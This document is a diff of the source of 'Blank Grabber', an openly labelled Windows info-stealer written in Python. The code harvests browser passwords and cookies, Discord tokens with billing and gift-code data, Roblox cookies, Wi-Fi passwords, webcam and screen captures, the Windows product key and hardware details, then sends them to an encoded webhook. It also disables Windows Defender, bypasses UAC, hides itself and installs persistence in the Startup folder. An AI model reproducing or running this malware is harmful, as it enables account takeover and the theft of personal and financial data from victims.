@@ -1,7 +1,7 @@
 # UTF-8
 # https://github.com/Blank-c/Blank-Grabber
 
-WEBHOOK = "Do NOT Enter anything here! Enter your webhook in webhook.txt"
+WEBHOOK = "Do NOT Enter anything here! Use the builder only!" #flag: faxxhookxxx Do not remove the flag
 
 import os, sys
 if os.name!="nt" or not hasattr(sys, "frozen"):
@@ -132,13 +132,21 @@ class BlankGrabber:
     def __init__(self):
         self.http = http
         self.webhook = WEBHOOK
-        self.getPKey()
         self.archive = os.path.join(os.getenv("temp"), f"Blank-{os.getlogin()}.zip")
         self.tempfolder = os.path.join(os.getenv("temp"), generate(10, True))
         self.system = os.path.join(self.tempfolder, "System")
         self.localappdata = os.getenv("localappdata")
         self.roaming = os.getenv("appdata")
         self.chromefolder = os.path.join(self.localappdata, "Google", "Chrome", "User Data")
+        self.grabbed_data = {
+            "Cookies" : 0,
+            "Passwords" : 0,
+            "Webcam" : 0,
+            "Discord Info" : 0,
+            "Roblox Cookies" : 0,
+            "Games" : 0,
+            "Screenshot" : 0
+        }
         try:
             os.makedirs(self.tempfolder, exist_ok= True)
             os.makedirs(self.system, exist_ok= True)
@@ -146,12 +154,15 @@ class BlankGrabber:
             os._exit(0)
         threads = []
         self.tokens = []
-        t = k = None
+        t = None
         self.passwords = self.cookies = self.roblocookies = []
         t = threading.Thread(target= lambda: self.getWifiPasswords())
         t.start()
         threads.append(t)
-        t = threading.Thread(target= lambda: self.getip())
+        t = threading.Thread(target= lambda: self.getPCInfo())
+        t.start()
+        threads.append(t)
+        t = threading.Thread(target= lambda: self.getipInfo())
         t.start()
         threads.append(t)
         t = threading.Thread(target= lambda: self.webshot())
@@ -161,8 +172,8 @@ class BlankGrabber:
         t.start()
         threads.append(t)
         if os.path.isfile(os.path.join(self.chromefolder, "Local State")):
-            k = threading.Thread(target= lambda: self.getcookie())
-            k.start()
+            t = threading.Thread(target= lambda: self.getcookie())
+            t.start()
             threads.append(t)
             t = threading.Thread(target= lambda: self.getpass())
             t.start()
@@ -178,11 +189,6 @@ class BlankGrabber:
         t.start()
         threads.append(t)
         t = threading.Thread(target= lambda: self.minecraft_stealer())
-        t.start()
-        threads.append(t)
-        if k is not None:
-            k.join()
-        t = threading.Thread(target= lambda: self.roblox_stealer())
         t.start()
         threads.append(t)
 
@@ -214,11 +220,7 @@ class BlankGrabber:
             img.save(os.path.join(self.tempfolder, "Webcam.png"), "png")
         os.remove(os.path.join(sys._MEIPASS, "Webcam.bmp"))
         os.remove(os.path.join(sys._MEIPASS, "cm.bam"))
-
-    def getPKey(self):
-        key = force_decode(subprocess.run("powershell Get-ItemPropertyValue -Path 'HKLM:SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SoftwareProtectionPlatform' -Name BackupProductKeyDefault", capture_output= True, shell= True).stdout).strip()
-        if len(key.split("-")) == 5:
-            self.productKey = key
+        self.grabbed_data["Webcam"] += 1
 
     @catch
     def copy(self, source, destination):
@@ -267,6 +269,7 @@ class BlankGrabber:
             os.makedirs((directory := os.path.join(self.tempfolder, "Credentials")), exist_ok= True)
             with open(os.path.join(directory, "Browser Passwords.txt"), "w", encoding= "utf-8", errors= "ignore") as file:
                 file.write("\n\n".join(self.passwords))
+            self.grabbed_data["Passwords"] = len(self.passwords)
 
     @catch
     def getcookie(self):
@@ -282,6 +285,8 @@ class BlankGrabber:
             os.makedirs(directory := os.path.join(self.tempfolder, "Credentials"), exist_ok= True)
             with open(os.path.join(directory, "Browser Cookies.txt"), "w", encoding= "utf-8", errors= "ignore") as file:
                 file.write("\n\n".join(self.cookies))
+            self.grabbed_data["Cookies"] = len(self.cookies)
+        self.roblox_stealer()
 
     @catch
     def minecraft_stealer(self):
@@ -292,6 +297,7 @@ class BlankGrabber:
                 continue
             os.makedirs(grabpath := os.path.join(self.tempfolder, "Gaming", "Minecraft"), exist_ok= True)
             self.copy(os.path.join(mcdir, i), os.path.join(grabpath, i))
+            self.grabbed_data["Games"] += 1
 
     @catch
     def roblox_stealer(self):
@@ -316,6 +322,8 @@ class BlankGrabber:
             os.makedirs(rbdir := os.path.join(self.tempfolder, "Gaming", "Roblox"), exist_ok= True)
             with open(os.path.join(rbdir, "Roblox Cookies.txt"), "w", encoding= "utf-8", errors= "ignore") as file:
                 file.write(("\n" + "Blank Grabber".center(50, "=")).join(self.roblocookies))
+            self.grabbed_data["Games"] += 1
+            self.grabbed_data["Roblox Cookies"] += 1
 
     @catch
     def crash_bd(self):
@@ -355,7 +363,7 @@ class BlankGrabber:
 
         @catch
         def getAV():
-            output = subprocess.run(r"WMIC /Node:localhost /Namespace:\\root\SecurityCenter2 Path AntivirusProduct Get displayName", capture_output= True, shell= True)
+            output = subprocess.run("WMIC /Node:localhost /Namespace:\\\\root\\SecurityCenter2 Path AntivirusProduct Get displayName", capture_output= True, shell= True)
             if not output.returncode:
                 output = force_decode(output.stdout).strip().splitlines()
                 if len(output) >= 2:
@@ -481,20 +489,61 @@ class BlankGrabber:
                 phone = r["phone"] if r["phone"] else "(No Phone Number)"
                 verified=r["verified"]
                 mfa = r["mfa_enabled"]
-                nitro_data = json.loads(self.http.request("GET", "https://discordapp.com/api/v6/users/@me/billing/subscriptions", headers=self.headers(token)).data.decode())
-                has_nitro = len(nitro_data)>0
+                nitro_data = json.loads(self.http.request("GET", "https://discordapp.com/api/v9/users/@me", headers=self.headers(token)).data.decode())
+                nitro_data = nitro_data.get("premium_type", 0)
+                if nitro_data == 0:
+                    nitro_data = "No Nitro"
+                elif nitro_data == 1:
+                    nitro_data = "Nitro Classic"
+                else:
+                    nitro_data = "Nitro Boost"
 
-                billing = len(json.loads(self.http.request("GET", "https://discordapp.com/api/v6/users/@me/billing/payment-sources", headers=self.headers(token)).data.decode()))>0
-                data.append(f"{'Blank Grabber'.center(90, '-')}\n\nUsername: {user}\nUser ID: {id}\nToken: {token}\nMFA: {'Yes' if mfa else 'No'}\nEmail: {email}\nPhone: {phone}\nVerified: {verified}\nNitro: {'Yes' if has_nitro else 'No'}\nHas Billing Info: {'Yes' if billing else 'No'}")
+                billing = len(json.loads(self.http.request("GET", "https://discordapp.com/api/v9/users/@me/billing/payment-sources", headers=self.headers(token)).data.decode()))>0
+                billing = json.loads(self.http.request("GET", "https://discordapp.com/api/v9/users/@me/billing/payment-sources", headers=self.headers(token)).data.decode())
+                if len(billing) == 0:
+                    billing = False
+                else:
+                    for m in billing:
+                        method_type = m.get("type", 0)
+                        if method_type == 0:
+                            billing = "(Unknown)"
+                        elif method_type == 1:
+                            billing = "Card"
+                        else:
+                            billing = "Paypal"
+                
+                gifts = []
+                r = self.http.request("GET", "https://discord.com/api/v9/users/@me/outbound-promotions/codes", headers= self.headers(token)).data.decode()
+                if "code" in r:
+                    r = json.loads(r)
+                    for i in r:
+                        code = i.get("code")
+                        if i.get("promotion") is None:
+                            continue
+                        title = i["promotion"].get("outbound_title")
+                        if code and title:
+                            gifts.append(f"{title}: {code}")
+                if len(gifts) == 0:
+                    gifts = "Gift Codes: (NONE)"
+                else:
+                    gifts = "Gift Codes:\n\t" + "\n\t".join(gifts)
+
+                data.append(f"{'Blank Grabber'.center(90, '-')}\n\nUsername: {user}\nUser ID: {id}\nMFA: {mfa}\nEmail: {email}\nPhone: {phone}\nVerified: {verified}\nNitro: {nitro_data}\nBilling Info: {billing}\n\nToken: {token}\n\n{gifts}")
         if len(data)!= 0:
             os.makedirs(discfolder := os.path.join(self.tempfolder, "Messenger", "Discord"), exist_ok= True)
             with open(os.path.join(discfolder, "Discord Info.txt"), "w", encoding= "utf-8", errors="ignore") as file:
                 file.write("\n\n".join(data))
+            self.grabbed_data["Discord Info"] = len(data)
 
     @catch
     def screenshot(self):
-        image = ImageGrab.grab()
+        image = ImageGrab.grab(bbox=None,
+            include_layered_windows=False,
+            all_screens=True,
+            xdisplay=None
+        )
         image.save(os.path.join(self.system, "Screenshot.png"))
+        self.grabbed_data["Screenshot"] += 1
 
     def headers(self, token=None):
         headers = {
@@ -507,18 +556,28 @@ class BlankGrabber:
         return headers
 
     @catch
-    def getip(self):
+    def getipInfo(self):
         try:
             r = json.loads(self.http.request("GET", "http://ip-api.com/json/?fields=225545").data.decode())
             if r.get("status") != "success":
                 raise Exception("Failed")
-            data = f"Computer Name: {os.getenv('computername')}\nComputer OS: {force_decode(subprocess.run('wmic os get Caption', capture_output= True, shell= True).stdout).strip().splitlines()[2].strip()}\nTotal Memory: {int(int(force_decode(subprocess.run('wmic computersystem get totalphysicalmemory', capture_output= True, shell= True).stdout).strip().split()[1])/1000000000)} GB" + "\nUUID: " + force_decode(subprocess.run("wmic csproduct get uuid", capture_output= True, shell= True).stdout).strip().split()[1] + (f"\nProduct Key: {self.productKey}" if self.productKey is not None else str())+ f"\nIP: {r['query']}\nRegion: {r['regionName']}\nCountry: {r['country']}\nTimezone: {r['timezone']}\n\n{'Cellular Network:'.ljust(20)} {chr(9989) if r['mobile'] else chr(10062)}\n{'Proxy/VPN:'.ljust(20)} {chr(9989) if r['proxy'] else chr(10062)}"
+            data = f"\nIP: {r['query']}\nRegion: {r['regionName']}\nCountry: {r['country']}\nTimezone: {r['timezone']}\n\n{'Cellular Network:'.ljust(20)} {chr(9989) if r['mobile'] else chr(10062)}\n{'Proxy/VPN:'.ljust(20)} {chr(9989) if r['proxy'] else chr(10062)}"
             if len(r["reverse"]) != 0:
                 data += f"\nReverse DNS: {r['reverse']}"
         except Exception:
             r = json.loads(self.http.request("GET", "http://httpbin.org/get").data.decode())
-            data = f"Computer Name: {os.getenv('computername')}\nComputer OS: {force_decode(subprocess.run('wmic os get Caption', capture_output= True, shell= True).stdout).strip().splitlines()[2].strip()}\nTotal Memory: {int(int(force_decode(subprocess.run('wmic computersystem get totalphysicalmemory', capture_output= True, shell= True).stdout).strip().split()[1])/1000000000)} GB" + "\nUUID: " + force_decode(subprocess.run('wmic csproduct get uuid', capture_output= True, shell= True).stdout).strip().split()[1] + (f"\nProduct Key: {self.productKey}" if self.productKey is not None else str()) + f"\nIP: {r.get('origin')}"
+            data = f"\nIP: {r.get('origin')}"
         self.ipinfo = data
+    
+    @catch
+    def getPCInfo(self):
+        self.ComputerName = os.getenv("computername")
+        self.ComputerOS = force_decode(subprocess.run('wmic os get Caption', capture_output= True, shell= True).stdout).strip().splitlines()[2].strip()
+        self.TotalMemory = int(int(force_decode(subprocess.run('wmic computersystem get totalphysicalmemory', capture_output= True, shell= True).stdout).strip().split()[1])/1000000000)
+        self.HWID = force_decode(subprocess.run('wmic csproduct get uuid', capture_output= True, shell= True).stdout).strip().split()[1]
+        self.CPU = force_decode(subprocess.run("powershell Get-ItemPropertyValue -Path 'HKLM:System\\CurrentControlSet\\Control\\Session Manager\\Environment' -Name PROCESSOR_IDENTIFIER", capture_output= True, shell= True).stdout).strip()
+        self.GPU = force_decode(subprocess.run("wmic path win32_VideoController get name", capture_output= True, shell= True).stdout).splitlines()[2].strip()
+        self.productKey = force_decode(subprocess.run("powershell Get-ItemPropertyValue -Path 'HKLM:SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SoftwareProtectionPlatform' -Name BackupProductKeyDefault", capture_output= True, shell= True).stdout).strip()
 
     @catch
     def zip(self):
@@ -526,21 +585,26 @@ class BlankGrabber:
 
     def send(self):
         self.zip()
+        grabbed_info = ""
+        for i, j in self.grabbed_data.items():
+            grabbed_info += f"{i} : {j}\n"
+        grabbed_info = grabbed_info.strip()
         payload = {
   "content": "@everyone" if PINGME else "",
   "embeds": [
     {
       "title": "Blank Grabber",
-      "description": f"```fix\n{self.ipinfo}```\n**Files: **```fix\n{self.tree(self.tempfolder, 'Blank Grabber')}```",
-      "url": "https://github.com/Blank-c/Blank-Grabber/",
-      "color": 16737536,
+      "description": f"**__System Info__\n```autohotkey\nComputer Name: {self.ComputerName}\nComputer OS: {self.ComputerOS}\nTotal Memory: {self.TotalMemory}\nHWID: {self.HWID}\nCPU: {self.CPU}\nGPU: {self.GPU}\nProduct Key: {self.productKey}```\n__IP Info__```prolog\n{self.ipinfo}```\n__Grabbed Info__```js\n{grabbed_info}```**",
+      "url": "https://github.com/Blank-c/Blank-Grabber",
+      "color": 34303,
       "footer": {
-        "text": "Grabbed By Blank Grabber!"
+        "text": "Grabbed by Blank Grabber | https://github.com/Blank-c/Blank-Grabber"
+      },
+      "thumbnail": {
+        "url": "https://raw.githubusercontent.com/Blank-c/Blank-Grabber/main/.github/workflows/image.png"
       }
     }
-  ],
-  "username": "Blank Grabber",
-  "avatar_url": "https://i.imgur.com/ZZZtlwB.png"
+  ]
 }
 
         self.webhook = force_decode(base64.b85decode(self.webhook.encode()))
@@ -560,15 +624,15 @@ if __name__ == "__main__":
         uac_bypass()
     if os.path.isfile(boundfile := os.path.join(sys._MEIPASS, "bound.exe")):
         shutil.copy(boundfile, boundfile := os.path.join(os.getenv("temp"), f"{generate()}.exe"))
-        #subprocess.Popen(f"\"{boundfile}\" && del \"{boundfile}\"", creationflags= (subprocess.SW_HIDE | subprocess.CREATE_NEW_CONSOLE), shell= True)
-        os.startfile(boundfile) # Does not auto delete the file after execution (will add it in future)
+        os.startfile(boundfile)
+
     t = threading.Thread(target= disable_wd)
     t.start()
     time.sleep(1)
     while True:
         try:
-            r = json.loads(http.request("GET", "https://httpbin.org/get?1=2").data.decode())
-            if r.get("args").get("1") != "2":
+            r = http.request("GET", "https://gstatic.com/generate_204")
+            if r.status != 204:
                 os._exit(1)
             if VMPROTECT:
                 try:
@@ -577,8 +641,7 @@ if __name__ == "__main__":
                     pass
                 except Exception:
                     os._exit(1)
-            frozen = hasattr(sys, "frozen")
-            if frozen and STARTUP:
+            if STARTUP:
                 if os.path.dirname(os.path.abspath(sys.executable)).lower().split(os.sep)[-1].lower() != "startup":
                     try:
                         exepath = os.path.join("C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\", f"ScreenSaver-{generate()}.scr")
@@ -587,7 +650,7 @@ if __name__ == "__main__":
                     except Exception:
                         pass
 
-            if frozen and HIDE_ITSELF and os.path.dirname(os.path.abspath(sys.executable)).lower().split(os.sep)[-1] != "startup":
+            if HIDE_ITSELF and os.path.dirname(os.path.abspath(sys.executable)).lower().split(os.sep)[-1] != "startup":
                 subprocess.run(f"attrib \"{sys.executable}\" +s +h", shell= True, capture_output= True)
             try:
                 wd_exclude()
